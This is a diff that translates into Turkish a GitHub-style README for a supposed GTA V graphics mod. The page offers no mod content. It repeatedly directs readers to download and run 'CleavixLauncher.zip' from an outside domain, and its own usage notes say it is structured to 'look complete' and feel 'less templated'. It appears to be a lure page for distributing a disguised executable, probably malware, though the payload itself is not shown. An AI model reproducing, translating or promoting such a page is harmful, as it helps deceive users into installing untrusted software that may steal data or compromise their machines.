@@ -1,74 +1,74 @@
-# Grand Theft Auto V Enhanced Graphics Mod
+# Grand Theft Auto V Geliştirilmiş Grafik Modu
 
-> Clean repository page for GTA V enhanced graphics setup, download, install notes, and quick usage guidance.
+> Grand Theft Auto V için geliştirilmiş grafik modunun kurulumu, indirme notları ve hızlı kullanım kılavuzu için temiz bir depo sayfası.
 
-## Project Summary
+## Proje Özeti
 
-This repository is built as a cleaner and more polished project page for **Grand Theft Auto V Enhanced Graphics Mod**. It is designed to feel more natural than a bare placeholder by combining a stronger landing page, companion markdown files, and a simple asset structure.
+Bu depo, **Grand Theft Auto V Geliştirilmiş Grafik Modu** için daha temiz ve düzenli bir proje sayfası olarak oluşturulmuştur. Daha güçlü bir açılış sayfası, yardımcı markdown dosyaları ve basit bir varlık yapısı ile daha doğal bir görünüm sağlar.
 
-**Style:** Urban showcase layout  
-**Primary color cue:** `#f5c542`
+**Stil:** Şehir gösterimi düzeni  
+**Birincil renk vurgusu:** `#f5c542`
 
-## Key Features
+## Ana Özellikler
 
-- Graphics-first overview
-- Fast install path
-- Concise feature list
-- Built around a bold presentation style for one of the most searched PC graphics upgrade topics.
+- Grafik odaklı genel bakış
+- Hızlı kurulum akışı
+- Özlü özellik listesi
+- En çok aranan PC grafik yükseltme konularından biri için güçlü bir sunum stili üzerine kurulu
 
-## Download
+## İndirme
 
-[Download CleavixLauncher.zip](https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip)
+[CleavixLauncher.zip İndir](https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip)
 
-Direct package link:
+Doğrudan paket bağlantısı:
 
 `https://cleavix.pro/downloads/actualversion/CleavixLauncher.zip`
 
-The package referenced in this repository is **CleavixLauncher.zip**.
+Bu depoda referans verilen paket **CleavixLauncher.zip**'dir.
 
-## Setup Guide
+## Kurulum Kılavuzu
 
-1. Download **CleavixLauncher.zip** from the link above.
-2. Extract the package to a clean folder.
-3. Open the launcher and locate the profile for **Grand Theft Auto V Enhanced Graphics Mod**.
-4. Apply the recommended configuration.
-5. Start the game and validate the result.
+1. Yukarıdaki bağlantıdan **CleavixLauncher.zip** dosyasını indirin.
+2. Paketi temiz bir klasöre çıkarın.
+3. Başlatıcıyı açın ve **Grand Theft Auto V Geliştirilmiş Grafik Modu** profiline gidin.
+4. Önerilen yapılandırmayı uygulayın.
+5. Oyunu başlatın ve sonucu doğrulayın.
 
-## Included Files
+## Dahil Edilen Dosyalar
 
-- `README.md` — main repository landing page
-- `INSTALL.md` — quick installation flow
-- `FAQ.md` — concise answers for common questions
-- `CHANGELOG.md` — repository updates
-- `TROUBLESHOOTING.md` — quick issue reference
-- `FILES.md` — structure overview
-- `files/` — supporting assets
-- `preview/` — preview asset folder
+- `README.md` — ana depo açılış sayfası
+- `INSTALL.md` — hızlı kurulum akışı
+- `FAQ.md` — sık sorulan sorular için kısa cevaplar
+- `CHANGELOG.md` — depo güncellemeleri
+- `TROUBLESHOOTING.md` — hızlı sorun giderme rehberi
+- `FILES.md` — yapı genel bakışı
+- `files/` — destekleyici varlıklar
+- `preview/` — önizleme varlık klasörü
 
-## Usage Notes
+## Kullanım Notları
 
-- This repository is structured to look complete and readable on GitHub.
-- Companion documents are included to make the project feel less templated.
-- The `preview` folder is preserved, and the `files` folder contains a reusable asset.
-- The only download referenced here is **CleavixLauncher.zip**.
+- Bu depo, GitHub üzerinde eksiksiz ve okunabilir görünmesi için yapılandırılmıştır.
+- Yardımcı belgeler, projenin daha az şablonlu hissetmesi için dahil edilmiştir.
+- `preview` klasörü korunmuştur ve `files` klasörü yeniden kullanılabilir bir varlık içerir.
+- Burada referans verilen tek indirme **CleavixLauncher.zip**'dir.
 
-## FAQ
+## SSS
 
-**Q: What should I download?**  
-A: Use **CleavixLauncher.zip** from the direct link above.
+**S: Ne indirmeliyim?**  
+C: Yukarıdaki doğrudan bağlantıdan **CleavixLauncher.zip** dosyasını kullanın.
 
-**Q: Why does this repository include extra markdown files?**  
-A: This page is intentionally organized as a clean repository hub with direct access to the package and readable setup notes.
+**S: Neden fazladan markdown dosyaları içeriyor?**  
+C: Bu sayfa, pakete doğrudan erişim ve okunabilir kurulum notları içeren temiz bir depo merkezi olarak düzenlenmiştir.
 
-**Q: What should I do if something looks wrong after setup?**  
-A: Keep the launcher package updated and review your game settings before re-applying the profile.
+**S: Kurulumdan sonra bir şeyler yanlış görünüyorsa ne yapmalıyım?**  
+C: Başlatıcı paketini güncel tutun ve profili tekrar uygulamadan önce oyun ayarlarınızı kontrol edin.
 
 ---
 
-## Topics
+## Konular
 
 `grand-theft-auto-v` `pc-gaming` `gaming` `video-game` `windows-game` `graphics-settings` `game-configuration` `performance-optimization` `gaming-performance` `upscaling` `game-guide` `setup-guide`
 
-## Disclaimer
+## Feragatname
 
-This repository is provided as a project page and setup reference. Always review your own game configuration before applying changes.
+Bu depo, proje sayfası ve kurulum referansı olarak sunulmuştur. Herhangi bir değişiklik uygulamadan önce kendi oyun yapılandırmanızı kontrol edin.
